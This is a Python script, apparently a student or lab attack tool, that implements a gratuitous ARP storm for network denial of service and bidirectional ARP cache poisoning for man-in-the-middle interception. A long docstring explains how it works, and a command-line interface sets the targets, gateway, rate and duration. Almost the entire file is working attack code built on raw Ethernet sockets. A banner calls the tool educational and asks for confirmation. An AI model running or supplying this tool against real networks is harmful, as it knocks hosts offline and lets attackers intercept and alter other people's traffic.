#!/usr/bin/env python3
"""
ARP DoS via Gratuitous ARP Storm Attack

Now this code is the main logic for the attack to happen,
now the main code onnthe other fiule uises this class to orchestrate the attack.
It have some classes to simulate the ARP protocol and Ethernet frames,
The ethernet frame class as you know is used to make the correct ethernet frames
like it includes the destination mac and source mac with type of ether, we used 0x0806 for ARP

The EtherType field is a 2-byte value in an Ethernet frame that indicates what protocol 
is encapsulated in the payload of the frame. It helps the revcevidving system how to interpret the data contained within the frame.

Now we are using 0x0806 as it is the official ethertyope value assigned to ARP by the IEEE, whihc signals the packet that it contains a ARP packet
For example 
Protocol EtherType(Hex)Description
IPv4 0x0800
ARP 0x0806
IPv6 0x86DD

NOw the pack() seriaklizes thge header into bytes (which we must to transmit it over the network)

Now the ARP packet class, here it constructs the ARP packets with setting the correct fielsd types
htype means hardware type = 1 for ethernet 
ptype means p[rotocol type = 0x0800 for IPv4
hlen means hardware length = 6 for MAC address  
plen means protocol length = 4 for IPv4 address
operation means the type of ARP operation, 1 for request and 2 for reply
sha means sender hardware address, which is the MAC address of the sender
spa means sender protocol address, which is the IP address of the sender
tha means target hardware address, which is the MAC address of the target
tpa means target protocol address, which is the IP address of the target


now we are at the main engine ARPStormAttacker class, which handles the ARP storm and poisoning attacks.
there is some key methods for this
create-gratuitous_arp() creates a gratuitous ARP packet, which is an ARP reply that announces the sender's own IP-MAC mapping.
create_poisoning_arp() constructs an ARP reply that fakes the mapping to poison the target's ARP cache.
create_ethernet_frame() wraps an ARP payload in an Ethernet frame ready to send.
storm_worker() is a worker thread for the ARP storm attack, it generates random MAC and IP addresses, creates gratuitous ARP packets, and sends them over a raw socket.
poison_worker() is a worker thread for targeted ARP poisoning, it forges ARP replies to poison both the victim and the gateway
start_storm_attack() starts the ARP storm attack by launching multiple storm worker threads and monitoring their progress.
start_poison_attack() starts the targeted ARP poisoning attack by launching a poison worker thread and monitoring its progress.
stop_attack() stops the attack by setting the running flag to False and waiting for all threads to finish.
main() is the entry point of the script, it parses command-line arguments, initializes the ARPStormAttacker instance, and starts the appropriate attack based on user input.


Now the attack workflows, 
the gratuitous arp storm flood thenetwork with fake arp packerts to disrupt comm
what it does is generates random MAC and IP addresses for  each packet, sends ARP replies again and again inmplying that ownership of the IP. It also runs in multiple threads to intense attack.
THe main goal is to overwhelm the swiotches and hosts with fake ARP entries, causes network DoS.

Now the second one is ARP poisoning, it redirect the traffic between traffic and gateway
What it does is actually simple, it send an ARP packet to the victim saying that I am the gateway and sends to the gateway that I am the victim, so the traffic will be redirected to the attacker.
This allows the attacker to intercept and manipulate the traffic between the victim and the gateway
TThus it can enable man in the middle attack, allow packet interception and modification
You can give custom parameters as well to run these, with 
-- storm, -- poison, -- subnet, -- targets, -- gateway, -- duration, -- threads, -- rate


"""

import socket
import struct
import random
import time
import threading
import argparse
import sys
from typing import List, Tuple


class EthernetFrame:
    """Ethernet frame header, instance represents an Ethernet frame header"""
    def __init__(self, dst_mac: bytes, src_mac: bytes, ethertype: int = 0x0806):
        self.dst_mac = dst_mac      # 6 bytes
        self.src_mac = src_mac      # 6 bytes  
        self.ethertype = ethertype  # 2 bytes (0x0806 for ARP)
    
    def pack(self) -> bytes:
        """This method serializes the header for packet transmission"""
        return struct.pack("!6s6sH", self.dst_mac, self.src_mac, self.ethertype)

class ARPPacket:
    """Represents an ARP payload, It customizes all ARP fields"""
    def __init__(self, 
                 htype: int = 1,        # Hardware type (Ethernet = 1)
                 ptype: int = 0x0800,   # Protocol type (IPv4 = 0x0800)
                 hlen: int = 6,         # Hardware length (MAC = 6)
                 plen: int = 4,         # Protocol length (IPv4 = 4)
                 operation: int = 2,    # Operation (Reply = 2)
                 sha: bytes = b'\x00' * 6,  # Sender hardware address
                 spa: bytes = b'\x00' * 4,  # Sender protocol address
                 tha: bytes = b'\x00' * 6,  # Target hardware address
                 tpa: bytes = b'\x00' * 4): # Target protocol address
        self.htype = htype
        self.ptype = ptype
        self.hlen = hlen
        self.plen = plen
        self.operation = operation
        self.sha = sha
        self.spa = spa
        self.tha = tha
        self.tpa = tpa
    
    def pack(self) -> bytes:
        """Pack outputs a binary ARP message ready for transmission"""
        return struct.pack("!HHBBH6s4s6s4s",
                          self.htype, self.ptype, self.hlen, self.plen,
                          self.operation, self.sha, self.spa, self.tha, self.tpa)

class ARPStormAttacker:
    """This is the main Engine of the attacker, it handles ARP storm and poisoning attacks"""
    
    def __init__(self, interface: str = "eth0"):
        # Default to 'eth0' for Docker containers
        self.interface = interface
        self.running = False # flag to control attack threads
        self.threads = [] # list of active threads
        self.packet_count = 0
        self.lock = threading.Lock() # to ensure thread safe access

    def ip_to_bytes(self, ip: str) -> bytes:
        """Convert IP string to bytes to 4 byte packed binary"""
        return socket.inet_aton(ip) # uses this for standardization
    
    def mac_to_bytes(self, mac: str) -> bytes:
        """Convert MAC string to bytes"""
        return bytes.fromhex(mac.replace(':', '').replace('-', '')) # removes separators :,- before conversion

    def random_mac(self) -> bytes:
        """Generate random MAC address"""
        return bytes([random.randint(0, 255) for _ in range(6)])
    
    def random_ip(self, subnet: str = "192.168.1") -> bytes:
        """Generate random IP in subnet"""
        return self.ip_to_bytes(f"{subnet}.{random.randint(1, 254)}")
    
    def create_gratuitous_arp(self, sender_ip: bytes, sender_mac: bytes) -> bytes:
        """Create a gratuitous ARP packet, Means it constructs a gratuitous ARP reply, sender claims that he owns the IP address"""
        # Gratuitous ARP: sender announces its own IP-MAC mapping
        arp = ARPPacket(
            operation=2,        # ARP Reply
            sha=sender_mac,     # Sender MAC, sender hardware address
            spa=sender_ip,      # Sender IP, sender protocol address
            tha=b'\x00' * 6,   # Target MAC (broadcast/ignored),  Target hardware address (set to all zeros, which is standard for gratuitous ARP)
            tpa=sender_ip       # Target IP (same as sender - gratuitous)
        )
        return arp.pack() # Converts the ARP packet object to raw bytes for transmission
    
    def create_poisoning_arp(self, target_ip: bytes, fake_mac: bytes, 
                           victim_ip: bytes) -> bytes:
        """Constructs an ARP reply faking the mapping to poison attack"""
        arp = ARPPacket(
            operation=2,        # ARP Reply , sender claims that he owns the IP address
            sha=fake_mac,       # Fake MAC, sender hardware address
            spa=target_ip,      # Target IP we're impersonating, the target
            tha=b'\xff' * 6,   # Broadcast, we have to send to everyone that address belongs to me
            tpa=victim_ip       # Victim IP, actually the server
        )
        return arp.pack() # convert the ARP packet object to raw bytes for transmission
    
    def create_ethernet_frame(self, arp_payload: bytes, 
                            src_mac: bytes = None, 
                            dst_mac: bytes = b'\xff\xff\xff\xff\xff\xff') -> bytes:
        """Create complete ethernet frame with ARP payload, it wraps an ARP payload in an Ethernet frame ready to send"""
        if src_mac is None:
            src_mac = self.random_mac()
        
        eth_frame = EthernetFrame(dst_mac, src_mac)
        return eth_frame.pack() + arp_payload # the arp payload goes with the ethernet frame headers

    def storm_worker(self, target_subnet: str, duration: int, packets_per_second: int):
        """Worker thread for ARP storm
        creates (optionally bound to interface) raw socket
        Selects random MAC and IP for every packet, simulating a storm
        Serializes a gratuitous ARP into an ethernet frame and sends over to raw socket"""
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            # creates a raw socket capable of sending Ethernet frames
            # AF_PACKET allows us to send raw Ethernet frames
            # SOCK_RAW provides raw network protocol access
            if self.interface:
                sock.bind((self.interface, 0)) # binds the socket to specific network interface

            interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
            start_time = time.time()
            # controls the intervals
            
            print(f"[*] Storm worker started - Target: {target_subnet}.0/24")
            
            while self.running and (time.time() - start_time) < duration:
                # while self running is true, that means attack flag is on,and elapsed time < duration
                try:
                    # Generate random source MAC and IP
                    src_mac = self.random_mac()
                    src_ip = self.random_ip(target_subnet)
                    # random source mac and random IP for the subnet

                    # Create gratuitous ARP
                    arp_payload = self.create_gratuitous_arp(src_ip, src_mac)
                    frame = self.create_ethernet_frame(arp_payload, src_mac)
                    # make an ethernet frame to transfer
                    # Send packet
                    sock.send(frame)
                    
                    with self.lock:
                        self.packet_count += 1
                    
                    if interval > 0:
                        time.sleep(interval)
                        
                except Exception as e:
                    print(f"[!] Error in storm worker: {e}")
                    break
            
            sock.close()
            print(f"[*] Storm worker finished")
            
        except PermissionError:
            print("[!] Permission denied. Run as administrator/root for raw sockets.")
        except Exception as e:
            print(f"[!] Error creating socket: {e}")
    
    def poison_worker(self, target_ips: List[str], gateway_ip: str, duration: int):
        """Worker thread for targeted ARP poisoning
        Iterates over each victim, forges ARP replies to poison both victim and gateway
        Sends ARP reply frames for bi directional MITM posisoning"""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
            if self.interface:
                sock.bind((self.interface, 0))
            
            start_time = time.time() # start time for duration control
            fake_mac = self.random_mac()
            # a fake mac address to use for poisoning

            print(f"[*] Poison worker started - Targets: {len(target_ips)} IPs")
            
            while self.running and (time.time() - start_time) < duration:
                # while self running is true, that means attack flag is on,and elapsed time < duration
                for target_ip in target_ips:
                    if not self.running:
                        break # checks for early termination signal

                    try:
                        # Poison target about gateway
                        arp_payload = self.create_poisoning_arp(
                            self.ip_to_bytes(gateway_ip),
                            fake_mac,
                            self.ip_to_bytes(target_ip)
                        )
                        # the dateway ip belongs to fake_mac, and the target ip is the victim
                        # victims ARP cache now maps gateway IP - attacker Mac (Fake)
                        frame = self.create_ethernet_frame(arp_payload, fake_mac)
                        sock.send(frame)
                        
                        # Poison gateway about target
                        arp_payload = self.create_poisoning_arp(
                            self.ip_to_bytes(target_ip),
                            fake_mac,
                            self.ip_to_bytes(gateway_ip)
                        )
                        # the victim ip is mapped to fake_mac
                        # gateway ARP cache now maps victim IP - attacker Mac (Fake)
                        frame = self.create_ethernet_frame(arp_payload, fake_mac)
                        sock.send(frame)
                        
                        with self.lock:
                            self.packet_count += 2
                            
                    except Exception as e:
                        print(f"[!] Error poisoning {target_ip}: {e}")
                
                time.sleep(0.1)  # Brief pause between rounds
            
            sock.close()
            print(f"[*] Poison worker finished")
            
        except Exception as e:
            print(f"[!] Error in poison worker: {e}")
    
    def start_storm_attack(self, target_subnet: str = "192.168.1", 
                          duration: int = 60, 
                          num_threads: int = 4, 
                          packets_per_second: int = 100):
        """Start gratuitous ARP storm attack
        prints the attack parameters
        Starts storm worker threads according to user parameters
        Prints stats every 5 minutes
        Handles keyboard interrupt"""

        print(f"[*] Starting ARP Storm Attack")
        print(f"[*] Target Subnet: {target_subnet}.0/24")
        print(f"[*] Duration: {duration} seconds")
        print(f"[*] Threads: {num_threads}")
        print(f"[*] Rate: {packets_per_second} packets/second per thread")
        print(f"[*] Total Rate: {packets_per_second * num_threads} packets/second")
        
        self.running = True
        self.packet_count = 0
        
        # Start worker threads
        for i in range(num_threads):
            # for each thread
            thread = threading.Thread(
                target=self.storm_worker,
                args=(target_subnet, duration, packets_per_second)
            )
            # each thread runs with storm worker method
            thread.daemon = True # makes threads daemonic, that means it exits when main program exits
            thread.start()
            self.threads.append(thread)
        
        # Monitor progress
        start_time = time.time()
        try:
            while self.running and (time.time() - start_time) < duration:
                time.sleep(5)
                with self.lock: # thread safe calculations
                    elapsed = time.time() - start_time
                    rate = self.packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Packets sent: {self.packet_count}, Rate: {rate:.1f} pps, "
                          f"Elapsed: {elapsed:.1f}s")
        
        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
        
        self.stop_attack()
    
    def start_poison_attack(self, target_ips: List[str], gateway_ip: str, 
                           duration: int = 60):
        """Start targeted ARP poisoning attack
        Same as start_storm_attack, but only starts one poison_worker thread
        Prints peridics stats """
        print(f"[*] Starting ARP Poisoning Attack")
        print(f"[*] Targets: {target_ips}")
        print(f"[*] Gateway: {gateway_ip}")
        print(f"[*] Duration: {duration} seconds")
        
        self.running = True
        self.packet_count = 0
        
        # Start poison worker
        thread = threading.Thread(
            target=self.poison_worker,
            args=(target_ips, gateway_ip, duration)
        )
        thread.daemon = True
        thread.start()
        self.threads.append(thread)
        
        # Monitor progress
        start_time = time.time()
        try:
            while self.running and (time.time() - start_time) < duration:
                time.sleep(5)
                with self.lock:
                    elapsed = time.time() - start_time
                    rate = self.packet_count / elapsed if elapsed > 0 else 0
                    print(f"[*] Packets sent: {self.packet_count}, Rate: {rate:.1f} pps")
        
        except KeyboardInterrupt:
            print("\n[*] Attack interrupted by user")
        
        self.stop_attack()
    
    def stop_attack(self):
        """Stop the attack"""
        print("[*] Stopping attack...")
        self.running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=2)
        
        self.threads.clear()
        print(f"[*] Attack stopped. Total packets sent: {self.packet_count}")

def main():
    parser = argparse.ArgumentParser(
        description="ARP DoS via Gratuitous ARP Storm",
        epilog="Example: python arp_dos_storm.py --storm --subnet 192.168.1 --duration 30"
    )
    
    parser.add_argument('--interface', '-i', 
                       help='Network interface to use')
    parser.add_argument('--storm', action='store_true',
                       help='Launch gratuitous ARP storm attack')
    parser.add_argument('--poison', action='store_true',
                       help='Launch targeted ARP poisoning attack')
    parser.add_argument('--subnet', default='192.168.1',
                       help='Target subnet (default: 192.168.1)')
    parser.add_argument('--targets', nargs='+',
                       help='Target IP addresses for poisoning')
    parser.add_argument('--gateway', default='192.168.1.1',
                       help='Gateway IP for poisoning (default: 192.168.1.1)')
    parser.add_argument('--duration', '-d', type=int, default=60,
                       help='Attack duration in seconds (default: 60)')
    parser.add_argument('--threads', '-t', type=int, default=4,
                       help='Number of threads for storm attack (default: 4)')
    parser.add_argument('--rate', '-r', type=int, default=100,
                       help='Packets per second per thread (default: 100)')
    
    args = parser.parse_args()
    
    if not (args.storm or args.poison):
        parser.print_help()
        print("\n[!] Please specify --storm or --poison attack mode")
        return
    
    print("="*60)
    print("ARP DoS via Gratuitous ARP Storm Attack Tool")
    print("Educational/Research Purpose Only")
    print("="*60)
    print("[!] WARNING: This tool can disrupt network operations!")
    print("[!] Use only on networks you own or have explicit permission to test!")
    print("="*60)
    
    # Get confirmation
    response = input("Continue? (yes/no): ").lower().strip()
    if response != 'yes':
        print("[*] Aborted by user")
        return
    
    attacker = ARPStormAttacker(args.interface)
    
    try:
        if args.storm:
            attacker.start_storm_attack(
                target_subnet=args.subnet,
                duration=args.duration,
                num_threads=args.threads,
                packets_per_second=args.rate
            )
        
        elif args.poison:
            if not args.targets:
                print("[!] Please specify target IPs with --targets")
                return
            
            attacker.start_poison_attack(
                target_ips=args.targets,
                gateway_ip=args.gateway,
                duration=args.duration
            )
    
    except Exception as e:
        print(f"[!] Attack failed: {e}")
    
    finally:
        attacker.stop_attack()

if __name__ == "__main__":
    main()
